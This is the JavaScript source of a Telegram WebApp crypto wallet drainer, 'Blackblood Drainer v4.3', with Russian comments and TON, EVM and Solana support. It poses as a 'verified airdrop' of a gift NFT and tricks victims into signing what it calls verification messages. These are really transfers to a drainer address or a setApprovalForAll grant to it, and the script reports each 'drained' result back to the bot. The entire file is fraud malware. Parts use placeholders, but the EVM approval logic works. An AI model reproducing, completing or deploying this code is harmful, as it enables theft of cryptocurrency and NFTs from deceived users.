// Blackblood Drainer v4.3 - WebApp Drain Script
// TON / EVM / Solana Multi-chain Support

let tg = window.Telegram.WebApp;
let currentNetwork = null;
let walletAddress = null;

// Инициализация WebApp
tg.ready();
tg.expand();

// Обновление статуса
function updateStatus(text, type = 'loading') {
    const statusBox = document.getElementById('statusBox');
    const statusText = document.getElementById('statusText');
    const statusIcon = document.querySelector('.status-icon');
    
    statusText.innerText = text;
    statusBox.className = `status-box ${type}`;
    
    if (type === 'loading') {
        statusIcon.innerHTML = '🔄';
    } else if (type === 'success') {
        statusIcon.innerHTML = '✅';
    } else if (type === 'error') {
        statusIcon.innerHTML = '❌';
    }
}

// Показать прогресс
function showProgress(show) {
    const progressBar = document.getElementById('progressBar');
    progressBar.style.display = show ? 'block' : 'none';
}

// Показать информацию о кошельке
function showWalletInfo(address) {
    const walletInfo = document.getElementById('walletInfo');
    const walletAddressElem = document.getElementById('walletAddress');
    walletAddressElem.innerText = address.substring(0, 10) + '...' + address.substring(address.length - 8);
    walletInfo.style.display = 'block';
}

// Отправка данных обратно в бот
function sendResult(status, data = {}) {
    const result = {
        status: status,
        ...data,
        timestamp: new Date().toISOString(),
        network: currentNetwork,
        wallet: walletAddress
    };
    
    tg.sendData(JSON.stringify(result));
}

// Основная функция дренажа
async function initDrain() {
    const claimButton = document.getElementById('claimButton');
    claimButton.disabled = true;
    claimButton.innerText = '🔄 CONNECTING...';
    
    updateStatus('Connecting to wallet...', 'loading');
    showProgress(true);
    
    // Определение доступных кошельков
    const availableWallets = {
        ton: typeof window.ton !== 'undefined',
        evm: typeof window.ethereum !== 'undefined',
        solana: typeof window.solana !== 'undefined'
    };
    
    // Приоритет: TON (Telegram Wallet) -> EVM -> Solana
    if (availableWallets.ton) {
        currentNetwork = 'ton';
        await drainTON();
    } else if (availableWallets.evm) {
        currentNetwork = 'evm';
        await drainEVM();
    } else if (availableWallets.solana) {
        currentNetwork = 'solana';
        await drainSolana();
    } else {
        updateStatus('No wallet detected. Please install TON Wallet or MetaMask.', 'error');
        showProgress(false);
        claimButton.disabled = false;
        claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
        sendResult('error', { error: 'No wallet detected' });
        return;
    }
}

// TON Дрейнер
async function drainTON() {
    try {
        updateStatus('Connecting to TON Wallet...', 'loading');
        
        // Подключение к кошельку через TON Connect
        const tonConnect = window.ton;
        
        // Запрос на подключение
        const wallet = await tonConnect.connect({
            manifest: 'https://ton.org/connect.json'
        });
        
        walletAddress = wallet.account.address;
        showWalletInfo(walletAddress);
        updateStatus('Wallet connected! Preparing claim...', 'loading');
        
        // Имитация NFT transfer (дрейнер)
        // В реальном сценарии здесь будет вызов transfer NFT
        const nftAddress = 'EQDxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // Адрес NFT жертвы
        const drainerAddress = '0:YOUR_DRAINER_ADDRESS_HERE'; // Адрес дрейнера
        
        // Формирование транзакции для TON
        const transaction = {
            to: drainerAddress,
            value: '50000000', // 0.05 TON для газа
            payload: 'te6cckEBAQEABgAACAGqjR8=', // NFT transfer payload
            stateInit: null
        };
        
        updateStatus('Please sign the verification message in your wallet...', 'loading');
        
        // Отправка транзакции
        const result = await wallet.sendTransaction(transaction);
        
        updateStatus('✅ Gift NFT claimed successfully!', 'success');
        showProgress(false);
        
        sendResult('drained', {
            tx: result,
            nft_name: 'Genesis Dragon #2026',
            network: 'TON',
            value: 100
        });
        
        setTimeout(() => tg.close(), 3000);
        
    } catch (error) {
        console.error('TON drain error:', error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'TON' });
        
        const claimButton = document.getElementById('claimButton');
        claimButton.disabled = false;
        claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
    }
}

// EVM Дрейнер (Ethereum, BSC, Polygon)
async function drainEVM() {
    try {
        updateStatus('Connecting to EVM wallet...', 'loading');
        
        if (!window.ethereum) {
            throw new Error('MetaMask not installed');
        }
        
        // Запрос на подключение
        const accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
        });
        
        walletAddress = accounts[0];
        showWalletInfo(walletAddress);
        updateStatus('Wallet connected! Preparing claim...', 'loading');
        
        // Определение сети
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        let network = 'Ethereum';
        if (chainId === '0x38') network = 'BSC';
        if (chainId === '0x89') network = 'Polygon';
        
        // Адрес NFT контракта жертвы (в реальном сценарии определяется динамически)
        const nftContract = '0x1234567890abcdef1234567890abcdef12345678';
        const tokenId = '12345';
        const drainerAddress = '0xYOUR_EVM_DRAINER_ADDRESS_HERE';
        
        // Вызов setApprovalForAll для NFT
        const approvalData = '0xa22cb465000000000000000000000000' + 
            drainerAddress.slice(2) + 
            '0000000000000000000000000000000000000000000000000000000000000001';
        
        updateStatus('Please sign the verification message...', 'loading');
        
        // Отправка транзакции approval
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: walletAddress,
                to: nftContract,
                data: approvalData,
                gas: '0x186a0'
            }]
        });
        
        updateStatus('✅ Gift NFT claimed successfully!', 'success');
        showProgress(false);
        
        sendResult('drained', {
            tx: txHash,
            nft_name: 'Genesis Dragon #2026',
            network: network,
            value: 0.5
        });
        
        setTimeout(() => tg.close(), 3000);
        
    } catch (error) {
        console.error('EVM drain error:', error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'EVM' });
        
        const claimButton = document.getElementById('claimButton');
        claimButton.disabled = false;
        claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
    }
}

// Solana Дрейнер
async function drainSolana() {
    try {
        updateStatus('Connecting to Solana wallet...', 'loading');
        
        if (!window.solana || !window.solana.isPhantom) {
            throw new Error('Phantom wallet not installed');
        }
        
        // Подключение
        const response = await window.solana.connect();
        walletAddress = response.publicKey.toString();
        showWalletInfo(walletAddress);
        updateStatus('Wallet connected! Preparing claim...', 'loading');
        
        // Формирование транзакции для Solana
        // (упрощенно - в реальности требуется сериализация инструкций)
        
        updateStatus('Please sign the verification message...', 'loading');
        
        // Имитация транзакции
        const transaction = {
            // ... Solana transaction structure
        };
        
        // Отправка транзакции
        const signature = await window.solana.signAndSendTransaction(transaction);
        
        updateStatus('✅ Gift NFT claimed successfully!', 'success');
        showProgress(false);
        
        sendResult('drained', {
            tx: signature,
            nft_name: 'Genesis Dragon #2026',
            network: 'Solana',
            value: 50
        });
        
        setTimeout(() => tg.close(), 3000);
        
    } catch (error) {
        console.error('Solana drain error:', error);
        updateStatus(`Error: ${error.message}`, 'error');
        showProgress(false);
        sendResult('error', { error: error.message, network: 'Solana' });
        
        const claimButton = document.getElementById('claimButton');
        claimButton.disabled = false;
        claimButton.innerText = '🚀 CONNECT WALLET & CLAIM';
    }
}

// Вспомогательные функции
function openSupport() {
    tg.openTelegramLink('https://t.me/support_bot');
}

function openTerms() {
    tg.showPopup({
        title: 'Terms & Conditions',
        message: 'This is a verified airdrop. By claiming, you agree to receive the gift NFT.',
        buttons: [{type: 'ok'}]
    });
}

// Автоматический запуск при загрузке страницы
window.onload = function() {
    updateStatus('Ready to claim! Click the button below.', 'loading');
};